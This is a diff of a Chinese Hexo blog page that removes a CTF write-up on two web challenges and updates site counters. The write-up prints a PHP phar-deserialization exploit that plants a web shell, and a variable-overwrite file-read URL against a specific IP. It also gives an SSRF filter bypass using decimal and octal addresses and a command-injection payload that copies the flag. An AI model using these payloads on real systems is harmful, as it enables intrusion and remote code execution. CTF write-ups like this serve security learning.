-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-12-30 20:08:31" itemprop="dateCreated datePublished" datetime="2020-12-30T20:08:31+08:00">2020-12-30</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-21 16:13:22" itemprop="dateModified" datetime="2021-01-21T16:13:22+08:00">2021-01-21</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>4.1k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h1><p>题目给出源码：</p>
-<pre><code class="php"> &lt;?php
-error_reporting(E_ALL);
-$sandbox = &#39;/var/www/html/uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
-if(!is_dir($sandbox)) {
-    mkdir($sandbox);
-}
-include_once(&#39;template.php&#39;);
-$template = array(&#39;tp1&#39;=&gt;&#39;tp1.tpl&#39;,&#39;tp2&#39;=&gt;&#39;tp2.tpl&#39;,&#39;tp3&#39;=&gt;&#39;tp3.tpl&#39;);
-if(isset($_GET[&#39;var&#39;]) &amp;&amp; is_array($_GET[&#39;var&#39;])) {
-    extract($_GET[&#39;var&#39;], EXTR_OVERWRITE);
-} else {
-    highlight_file(__file__);
-    die();
-}
-if(isset($_GET[&#39;tp&#39;])) {
-    $tp = $_GET[&#39;tp&#39;];
-    if (array_key_exists($tp, $template) === FALSE) {
-        echo &quot;No! You only have 3 template to reader&quot;;
-        die();
-    }
-    $content = file_get_contents($template[$tp]);
-    $temp = new Template($content);
-} else {
-    echo &quot;Please choice one template to reader&quot;;
-}
-?&gt; </code></pre>
-<ul>
-<li>这里存在一个变量覆盖<code>extract($_GET[&#39;var&#39;], EXTR_OVERWRITE);</code>，只需覆盖<code>$template</code></li>
-</ul>
-<p>即可,读取任意文件，直接读取template.php,得到源码：</p>
-<pre><code class="PHP">http://8.129.41.25:10305/?var[template][a]=template.php&amp;tp=a</code></pre>
-<ul>
-<li>template.php</li>
-</ul>
-<pre><code class="PHP">&lt;?php
-class Template{
-    public $content;
-    public $pattern;
-    public $suffix;
-
-    public function __construct($content){
-        $this-&gt;content = $content;
-        $this-&gt;pattern = &quot;/{{([a-z]+)}}/&quot;;
-        $this-&gt;suffix = &quot;.html&quot;;
-    }
-
-    public function __destruct() {
-        $this-&gt;render();
-    }
-    public function render() {
-        while (True) {
-            if(preg_match($this-&gt;pattern, $this-&gt;content, $matches)!==1) 
-                break;
-            global ${$matches[1]};
-
-            if(isset(${$matches[1]})) {
-                $this-&gt;content = preg_replace($this-&gt;pattern, ${$matches[1]}, $this-&gt;content);
-            } 
-            else{
-                break;
-            }
-        }
-        if(strlen($this-&gt;suffix)&gt;5) {
-            echo &quot;error suffix&quot;;
-            die();
-        }
-        $filename = &#39;/var/www/html/uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;/&quot; . md5($this-&gt;content) . $this-&gt;suffix;
-        file_put_contents($filename, $this-&gt;content);
-        echo &quot;Your html file is in &quot; . $filename;
-    }
-}
-
-?&gt;</code></pre>
-<p>源码比较简单，在前面的源码通过<code>file_getcontents</code>读取到内容之后传入<code>Template</code>类再写入文件。由于<code>file_getcontents</code>的参数完全可控，我们可以远程下载文件到靶机，并且可以使用phar反序列化可以控制<code>suffix</code>属性，把写入文件的后缀改成PHP，导致rce.</p>
-<p>Exp:</p>
-<pre><code class="php">&lt;?php
-class Template{
- public $content;
- public $pattern;
- public $suffix;
-
- public function __construct($content){
-  $this-&gt;content = $content;
-  $this-&gt;pattern = &quot;/{{([a-z]+)}}/&quot;;
-  $this-&gt;suffix = &quot;.php&quot;;
- }
-}
-    @unlink(&quot;test.phar&quot;);
-    $phar = new Phar(&quot;test.phar&quot;);//后缀名必须为phar
-    $phar-&gt;startBuffering();
-    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);//设置stub
-    $o = new Template(&quot;&lt;?php system(\$_GET[_]);?&gt;&quot;);
-    $phar-&gt;setMetadata($o);//将自定义的meta-data存入manifest
-    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);//添加要压缩的文件
-    $phar-&gt;stopBuffering();
-?&gt;</code></pre>
-<ul>
-<li>下载到靶机：</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175549@2x.png" alt="WX20201225-175549@2x"></p>
-<ul>
-<li>反序列化</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175738@2x.png" alt="WX20201225-175738@2x"></p>
-<ul>
-<li>读取flag</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175957@2x.png" alt="WX20201225-175957@2x"></p>
-<h1 id="easyjs"><a href="#easyjs" class="headerlink" title="easyjs"></a>easyjs</h1><p>源码：</p>
-<pre><code class="javascript">/routes/index.js
-var express = require(&#39;express&#39;);
-var config = require(&#39;../config&#39;);
-var url=require(&#39;url&#39;);
-var child_process=require(&#39;child_process&#39;);
-var fs=require(&#39;fs&#39;);
-var request=require(&#39;request&#39;);
-var router = express.Router();
-
-
-var blacklist=[&#39;127.0.0.1.xip.io&#39;,&#39;::ffff:127.0.0.1&#39;,&#39;127.0.0.1&#39;,&#39;0&#39;,&#39;localhost&#39;,&#39;0.0.0.0&#39;,&#39;[::1]&#39;,&#39;::1&#39;];
-
-router.get(&#39;/&#39;, function(req, res, next) {
-    res.json({});
-});
-
-router.get(&#39;/debug&#39;, function(req, res, next) {
-    console.log(req.ip);
-    if(blacklist.indexOf(req.ip)!=-1){
-        console.log(&#39;res&#39;);
-    var u=req.query.url.replace(/[\&quot;\&#39;]/ig,&#39;&#39;);
-    console.log(url.parse(u).href);
-    let log=`echo  &#39;${url.parse(u).href}&#39;&gt;&gt;/tmp/log`;
-    console.log(log);
-    child_process.exec(log);
-    res.json({data:fs.readFileSync(&#39;/tmp/log&#39;).toString()});
-    }else{
-        res.json({});
-    }
-});
-
-
-router.post(&#39;/debug&#39;, function(req, res, next) {
-    console.log(req.body);
-    if(req.body.url !== undefined) {
-        var u = req.body.url;
-    var urlObject=url.parse(u);
-    if(blacklist.indexOf(urlObject.hostname) == -1){
-        var dest=urlObject.href;
-        request(dest,(err,result,body)=&gt;{
-            res.json(body);
-        })
-    }
-    else{
-        res.json([]);
-    }
-    }
-});
-module.exports = router;</code></pre>
-<ul>
-<li><p>GET 的debug路由中有一个命令执行，会将结果写入<code>/tmp/log</code>,但是要进入这个命令执行的分支必须通过ip黑名单的检测。`blacklist.indexOf(req.ip)!=-1。</p>
-</li>
-<li><p>我们在来看POST的debug路由很明显是一个SSRF。这里传递一个参数url,URL经过：url.parse解码后hostname不能再黑名单中。黑名单过滤的不全我们完全可以用十进制胡总八进制的方式绕过例如：<code>http://2130706433/</code>、<code>http://0177.0.0.01/</code></p>
-</li>
-<li><p>绕过SSRF之后我们就是要闭合单引号来执行多条命令了，这里有一个trick在<code>@</code>符号之前输入<code>%27</code>，会经过url解码变成单引号。</p>
-</li>
-</ul>
-<p>所以最终payload是：</p>
-<pre><code>url= http://2130706433:10300/debug?url=http://%2527@1;cp$IFS$9/flag$IFS$9/tmp/log;%23</code></pre><p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG9620.png" alt="WechatIMG9620"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2493,7 +2382,7 @@ module.exports = router;</code></pre>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">77</span>
+          <span class="site-state-item-count">79</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2564,12 +2453,12 @@ module.exports = router;</code></pre>
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">287k</span>
+    <span title="站点总字数">292k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:21</span>
+    <span title="站点阅读时长">4:26</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
